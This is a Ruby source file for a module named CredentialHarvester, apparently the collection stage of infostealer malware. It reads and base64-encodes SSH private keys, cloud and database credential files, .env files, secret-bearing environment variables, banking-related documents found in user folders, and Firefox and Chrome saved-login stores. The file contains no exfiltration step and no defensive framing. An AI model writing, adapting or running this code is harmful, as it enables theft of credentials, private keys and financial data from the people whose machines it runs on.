require 'pathname'
require 'json'
require 'base64'
require 'digest'

module CredentialHarvester
  BANKING_INDICATORS = %w[
    bank banking credit debit card account balance transaction
    paypal stripe square venmo zelle chase wells_bofa citibank
    hsbc capital_one pnc usbank tdbank
  ].freeze

  CREDENTIAL_FILES = %w[
    .netrc
    .pgpass
    .my.cnf
    .s3cfg
    .aws/credentials
    .kube/config
    .ssh/id_rsa
    .ssh/id_ed25519
    .env
    .env.production
    .env.local
  ].freeze

  FINANCIAL_EXTENSIONS = %w[
    .csv .ofx .qfx .qif .gsd .mt940 .camt .pain .xml .json
  ].freeze

  class << self
    def collect_credentials
      results = { credentials: {}, financial_files: [], env_vars: {} }

      home = ENV['HOME'] || Dir.home
      return results unless home && File.directory?(home)

      CREDENTIAL_FILES.each do |rel_path|
        full_path = File.join(home, rel_path)
        next unless File.file?(full_path)

        begin
          content = File.read(full_path)
          results[:credentials][rel_path] = {
            path: full_path,
            size: content.bytesize,
            hash: Digest::SHA256.hexdigest(content),
            content_b64: Base64.strict_encode64(content)
          }
        rescue => e
          nil
        end
      end

      collect_env_credentials(results)
      collect_financial_files(results, home)

      results
    end

    def collect_env_credentials(results)
      financial_vars = ENV.select do |key, _|
        key.downcase =~ /pass|secret|key|token|credential|api_key|private|auth|bank|card/
      end

      financial_vars.each do |key, value|
        results[:env_vars][key] = {
          value_b64: Base64.strict_encode64(value),
          length: value.length
        }
      end
    end

    def collect_financial_files(results, root)
      search_dirs = [
        File.join(root, 'Documents'),
        File.join(root, 'Downloads'),
        File.join(root, 'Desktop'),
        '/tmp',
        '/var/tmp'
      ]

      search_dirs.each do |dir|
        next unless File.directory?(dir)

        Dir.glob(File.join(dir, '**', '*')).each do |filepath|
          next unless File.file?(filepath)
          ext = File.extname(filepath).downcase

          if FINANCIAL_EXTENSIONS.include?(ext)
            begin
              content = File.read(filepath)
              is_financial = BANKING_INDICATORS.any? { |kw| content.downcase.include?(kw) }

              if is_financial
                results[:financial_files] << {
                  path: filepath,
                  size: content.bytesize,
                  hash: Digest::SHA256.hexdigest(content),
                  preview_b64: Base64.strict_encode64(content[0..2048])
                }
              end
            rescue => e
              nil
            end
          end
        end
      end
    end

    def harvest_browser_data
      results = { browser_credentials: [] }
      home = ENV['HOME'] || Dir.home
      return results unless home

      browser_dirs = {
        'firefox' => File.join(home, '.mozilla', 'firefox'),
        'chromium' => File.join(home, '.config', 'chromium'),
        'google-chrome' => File.join(home, '.config', 'google-chrome')
      }

      browser_dirs.each do |name, base_dir|
        next unless File.directory?(base_dir)

        if name == 'firefox'
          Dir.glob(File.join(base_dir, '*.default*', 'logins.json')).each do |f|
            begin
              content = File.read(f)
              results[:browser_credentials] << {
                browser: name,
                file: f,
                data_b64: Base64.strict_encode64(content)
              }
            rescue => e
              nil
            end
          end
        else
          login_file = File.join(base_dir, 'Default', 'Login Data')
          if File.file?(login_file)
            begin
              content = File.read(login_file)
              results[:browser_credentials] << {
                browser: name,
                file: login_file,
                size: content.bytesize,
                hash: Digest::SHA256.hexdigest(content)
              }
            rescue => e
              nil
            end
          end
        end
      end

      results
    end
  end
end
